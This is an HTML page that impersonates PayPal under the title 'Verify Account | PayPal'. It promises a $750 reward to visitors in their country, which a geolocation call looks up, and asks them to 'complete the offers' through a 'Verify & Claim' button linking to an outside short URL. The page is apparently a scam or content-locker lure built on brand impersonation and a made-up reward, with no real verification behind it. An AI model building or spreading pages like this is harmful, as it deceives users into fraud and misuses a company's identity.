<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Account | PayPal</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 p-4">

    <div class="max-w-2xl mx-auto bg-white p-6 rounded-xl shadow-lg mt-10 text-center">
        <h2 class="text-2xl font-bold mb-4">Complete Final Verification</h2>
        <p class="text-gray-600 mb-6">
            To unlock your $<span id="amount">750</span> reward for users in <span id="country-name" class="font-bold">Loading...</span>, please complete the offers below.
        </p>

        <a href="https://confirmapp.store/sl/yz23d" target="_blank" 
           class="block w-full bg-green-500 text-white font-bold py-4 rounded-lg text-lg hover:bg-green-600">
            Verify & Claim
        </a>
    </div>

    <script>
        // Re-detect country here to keep the message consistent
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                document.getElementById('country-name').textContent = data.country_name;
            })
            .catch(error => {
                document.getElementById('country-name').textContent = "your country";
            });
    </script>
</body>
</html>
